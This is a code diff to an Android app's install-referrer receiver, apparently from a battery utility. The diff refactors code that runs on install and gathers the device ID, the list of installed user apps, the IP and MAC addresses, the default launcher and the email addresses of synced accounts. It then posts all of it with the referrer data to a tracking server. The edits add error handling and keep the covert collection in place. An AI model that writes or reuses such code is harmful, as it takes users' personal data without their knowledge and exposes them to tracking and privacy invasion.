@@ -57,7 +57,6 @@ import static com.receptix.batterybuddy.helper.Constants.Params.STATUS_SUCCESS;
 import static com.receptix.batterybuddy.helper.Constants.Urls.URL_TRACKING_OZOCK_INSTALLED;
 import static com.receptix.batterybuddy.helper.Constants.UtmParams.EXPECTED_PARAMETERS;
 import static com.receptix.batterybuddy.helper.Constants.UtmParams.PREFS_FILE_NAME;
-import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_ANID;
 import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_CAMPAIGN;
 import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_CONTENT;
 import static com.receptix.batterybuddy.helper.Constants.UtmParams.UTM_MEDIUM;
@@ -80,30 +79,16 @@ public class InstallReferrerReceiver extends BroadcastReceiver {
     public void onReceive(final Context context, Intent intent) {
 
         try {
-
             LogUtil.e(TAG, "onReceive()");
-
-            Log.d(TAG,intent.toString());
-
-
             String referrer = intent.getStringExtra("referrer");
-
-          //  String utm = "utm_source%3Dfiksu%26utm_medium%3Dbanner%26utm_term%3Drunning%252Bshoes%2520lose%26utm_content%3Dthere%2520is%2520no%2520%252Bterms%26utm_campaign%3Dbattery%2520boss%26anid%3Dfiksu";
-
-
             getUtmParameters(context, referrer);
-
-            String url = URL_TRACKING_OZOCK_INSTALLED;
             jsonObject.addProperty(REFERRER, referrer);
             jsonObject.addProperty(APP_NAME, context.getPackageName());
-            Log.e("packageName", context.getPackageName());
-            // get user details...
             fetchUserDetails(context);
             LogUtil.d(REFERRER_JSON_OBJECT, jsonObject.toString());
 
-
             Ion.with(context)
-                    .load(url)
+                    .load(URL_TRACKING_OZOCK_INSTALLED)
                     .setBodyParameter("data", jsonObject.toString())
                     .asJsonObject()
                     .setCallback(new FutureCallback<JsonObject>() {
@@ -132,37 +117,37 @@ public class InstallReferrerReceiver extends BroadcastReceiver {
 
     private void getUtmParameters(Context context, String referrer) {
 
-        Map<String, String> referralParams = new HashMap<String, String>();
+        if(referrer != null)
+        {
+            Map<String, String> referralParams = new HashMap<String, String>();
 
-        try {
-            utm = URLDecoder.decode(referrer, "UTF-8");
-        } catch (UnsupportedEncodingException e) {
-            e.printStackTrace();
+            try {
+                utm = URLDecoder.decode(referrer, "UTF-8");
+            } catch (UnsupportedEncodingException e) {
+                e.printStackTrace();
+            }
+
+            // Parse the query string, extracting the relevant data
+            String[] params = utm.split("&"); // $NON-NLS-1$
+            for (String param : params) {
+                String[] pair = param.split("="); // $NON-NLS-1$
+                referralParams.put(pair[0], pair[1]);
+            }
+            storeReferralParams(context, referralParams);
+
         }
-
-        // Parse the query string, extracting the relevant data
-        String[] params = utm.split("&"); // $NON-NLS-1$
-        for (String param : params) {
-            String[] pair = param.split("="); // $NON-NLS-1$
-            referralParams.put(pair[0], pair[1]);
-        }
-        storeReferralParams(context, referralParams);
-
-
     }
 
 
     public static void storeReferralParams(Context context, Map<String, String> params) {
         SharedPreferences storage = context.getSharedPreferences(PREFS_FILE_NAME, Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = storage.edit();
-
         for (String key : EXPECTED_PARAMETERS) {
             String value = params.get(key);
             if (value != null) {
                 editor.putString(key, value);
             }
         }
-
         editor.commit();
     }
 
@@ -170,7 +155,6 @@ public class InstallReferrerReceiver extends BroadcastReceiver {
     public static Map<String, String> retrieveReferralParams(Context context) {
         HashMap<String, String> params = new HashMap<String, String>();
         SharedPreferences storage = context.getSharedPreferences(PREFS_FILE_NAME, Context.MODE_PRIVATE);
-
         for (String key : EXPECTED_PARAMETERS) {
             String value = storage.getString(key, null);
             if (value != null) {
@@ -182,85 +166,112 @@ public class InstallReferrerReceiver extends BroadcastReceiver {
 
 
     private void fetchUserDetails(Context context) {
-        MCrypt mCrypt = new MCrypt();
-        // get device id
+
+        // get DEVICE ID
         String userDeviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
         jsonObject.addProperty(DEVICE_ID, userDeviceId);
         try {
-            String authkey = MCrypt.bytesToHex(mCrypt.encrypt(userDeviceId));
-            jsonObject.addProperty("authkey", authkey);
+            // encrypt device Id to make Auth Key
+            MCrypt mCrypt = new MCrypt();
+            String authorizationKey = MCrypt.bytesToHex(mCrypt.encrypt(userDeviceId));
+            jsonObject.addProperty(AUTH_KEY, authorizationKey);
         } catch (Exception e) {
             e.printStackTrace();
         }
 
+
         // get list of installed apps on user device
-        JsonArray installedAppsList = new JsonArray();
-        List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
-        for (int i = 0; i < packList.size(); i++) {
-            PackageInfo packInfo = packList.get(i);
-            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
-                String appName = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
-                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
-                installedAppsList.add(jsonPrimitive);
+        try {
+            JsonArray installedAppsList = new JsonArray();
+            List<PackageInfo> packList = context.getPackageManager().getInstalledPackages(0);
+            for (int i = 0; i < packList.size(); i++) {
+                PackageInfo packInfo = packList.get(i);
+                if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                    String appName = packInfo.applicationInfo.loadLabel(context.getPackageManager()).toString();
+                    JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
+                    installedAppsList.add(jsonPrimitive);
+                }
             }
+            jsonObject.add(INSTALLED_APPS, installedAppsList);
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
         }
 
-        // get user device information
-        StringBuilder deviceInfoStringBuilder = new StringBuilder();
-        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);
 
-        Field[] fields = Build.VERSION_CODES.class.getFields();
-        String osName = fields[Build.VERSION.SDK_INT + 1].getName();
-        deviceInfoStringBuilder.append(" OS Name :").append(osName);
+        // get user device information (Mac Address, IP Address, OS Name etc.)
+        try {
+            StringBuilder deviceInfoStringBuilder = new StringBuilder();
+            deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);
 
-        String deviceIpAddress = Utils.getIPAddress(true);
-        String deviceMacAddress = Utils.getMACAddress(WLAN);
-        if (deviceMacAddress.length() == 0) {
-            deviceMacAddress = Utils.getMACAddress(ETHERNET);
+            Field[] fields = Build.VERSION_CODES.class.getFields();
+            String osName = fields[Build.VERSION.SDK_INT + 1].getName();
+            deviceInfoStringBuilder.append(" OS Name :").append(osName);
+
+            jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
+
+            String deviceIpAddress = Utils.getIPAddress(true);
+            jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
+
+            String deviceMacAddress = Utils.getMACAddress(WLAN);
+            if (deviceMacAddress.length() == 0) {
+                deviceMacAddress = Utils.getMACAddress(ETHERNET);
+            }
+            jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
         }
 
-        // get the default launcher
-        Intent intent = new Intent(Intent.ACTION_MAIN);
-        intent.addCategory(Intent.CATEGORY_HOME);
-        ResolveInfo defaultLauncher = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
-        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;
-
+        // get the default launcher on user device
+        try {
+            Intent intent = new Intent(Intent.ACTION_MAIN);
+            intent.addCategory(Intent.CATEGORY_HOME);
+            ResolveInfo defaultLauncher = context.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
+            String defaultLauncherStr = defaultLauncher.activityInfo.packageName;
+            jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
 
         // Get user account (synced accounts on device)
-        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
-        Account[] accounts = AccountManager.get(context).getAccounts();
-        JsonArray userAccounts = new JsonArray();
+        try {
+            Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
+            Account[] accounts = AccountManager.get(context).getAccounts();
+            JsonArray userAccounts = new JsonArray();
 
-        for (Account account : accounts) {
-            if (emailPattern.matcher(account.name).matches()) {
-                String possibleEmail = account.name;
-                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
-                userAccounts.add(jsonPrimitive);
+            for (Account account : accounts) {
+                if (emailPattern.matcher(account.name).matches()) {
+                    String possibleEmail = account.name;
+                    JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
+                    userAccounts.add(jsonPrimitive);
+                }
             }
+            jsonObject.add(EMAILS, userAccounts);
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
         }
 
-        // create final JSONObject to be sent to server
-        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
-        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
-        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
-        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
-        jsonObject.add(INSTALLED_APPS, installedAppsList);
-        jsonObject.add(EMAILS, userAccounts);
+        try {
+            HashMap<String, String> params = (HashMap<String, String>) retrieveReferralParams(context);
+            utm_source = params.get(UTM_SOURCE).replace("%20", " ").replace("%2B", " ");
+            utm_medium = params.get(UTM_MEDIUM).replace("%20", " ").replace("%2B", " ");
+            utm_campaign = params.get(UTM_CAMPAIGN).replace("%20", " ").replace("%2B", " ");
 
-        utm_source = retrieveReferralParams(context).get("utm_source").replace("%20", " ").replace("%2B", " ");
-
-        utm_medium = retrieveReferralParams(context).get("utm_medium").replace("%20", " ").replace("%2B", " ");
-
-        utm_campaign = retrieveReferralParams(context).get("utm_campaign").replace("%20", " ").replace("%2B", " ");
-
-        jsonObject.addProperty(UTM_SOURCE, utm_source);
-        jsonObject.addProperty(UTM_MEDIUM, utm_medium);
-        jsonObject.addProperty(UTM_CAMPAIGN, utm_campaign);
-//        jsonObject.addProperty(UTM_TERM,retrieveReferralParams(context).get("utm_term"));
-//        jsonObject.addProperty(UTM_CONTENT,retrieveReferralParams(context).get("utm_content"));
-//        jsonObject.addProperty(UTM_ANID,retrieveReferralParams(context).get("anid"));
-
-
+            jsonObject.addProperty(UTM_SOURCE, utm_source);
+            jsonObject.addProperty(UTM_MEDIUM, utm_medium);
+            jsonObject.addProperty(UTM_CAMPAIGN, utm_campaign);
+        }
+        catch (Exception e)
+        {
+            e.printStackTrace();
+        }
     }
 
 }
